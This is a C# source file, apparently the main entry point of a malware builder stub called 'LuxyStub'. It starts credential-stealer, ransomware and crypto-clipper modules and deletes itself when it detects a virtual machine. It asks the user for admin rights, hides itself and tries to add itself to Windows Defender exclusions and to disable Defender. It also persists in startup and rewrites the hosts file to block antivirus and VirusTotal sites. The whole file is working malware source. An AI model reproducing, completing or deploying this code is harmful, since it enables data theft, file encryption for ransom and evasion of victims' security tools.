using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;
using LuxyStub.Components.AntiVM;
using LuxyStub.Components.Utilities;

namespace LuxyStub
{
    class Program
    {
        static void Main(string[] args)
        {
#if DEBUG
            MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(1);
#endif
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            Task.WaitAll(Process());

            Thread BlockAvSitesThread = new Thread(() => BlockAvSites());
            if (Settings.BlockAvSites && Syscalls.CheckAdminPrivileges()) BlockAvSitesThread.Start();

            if (Settings.StealerModule)
            {
                Thread StealerThread = new Thread(Modules.Stealer.Stealer.Start);
                StealerThread.Start();
                StealerThread.Join();
            }

            if (Settings.RansomewareModule)
            {
                Thread RansomwareThread = new Thread(Modules.Ransomware.Ransomeware.Start);
                RansomwareThread.Start();
                RansomwareThread.Join();
            }

            if (Settings.ClippperModule)
            {
                Modules.Clipper.Clipper.Start();
            }
        }

        static private async Task Process()
        {
            Syscalls.RegisterMutex();

            while (!await Common.IsConnectionAvailable())
                Thread.Sleep(60000); // Connection available. Retry every 1 min.

            if (Settings.AntiVm && Detector.IsVirtualMachine())
            {
                Console.WriteLine("Is VM");
                Common.SelfDelete(2); // Self-Delete if virtual machine is detected.
            }

            if (!Common.IsInStartup())
            {
                Syscalls.AskForAdmin(); // Prompts user to give admin privileges
            }

            if (Settings.Melt && !Common.IsInStartup())
                Syscalls.HideSelf();

            Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
            Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.

            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
                Common.PutInStartup(); // Puts itself in startup
        }

        static private async void BlockAvSites()
        {
            try
            {
                var bannedSites = new[] { "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com", "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com", "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com", "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "ccleaner.com" };
                var newData = new List<string>();
                string data;
                var hostsFilePath = Path.Combine(Environment.GetEnvironmentVariable("systemroot"), "System32", "drivers", "etc", "hosts");

                if (File.Exists(hostsFilePath))
                {
                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (var reader = new StreamReader(fileStream))
                        {
                            data = await reader.ReadToEndAsync();
                        }
                    }

                    foreach (var line in data.Split('\n'))
                    {
                        if (!bannedSites.Any(x => line.Contains(x)))
                        {
                            newData.Add(line);
                        }
                    }

                    foreach (var site in bannedSites)
                    {
                        newData.Add($"\t0.0.0.0 {site}");
                        newData.Add($"\t0.0.0.0 www.{site}");
                    }

                    data = string.Join("\n", newData);
                    data = data.Replace("\n\n", "\n");

                    using (var fileStream = new FileStream(hostsFilePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
                    {
                        using (var writer = new StreamWriter(fileStream))
                        {
                            await writer.WriteAsync(data);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
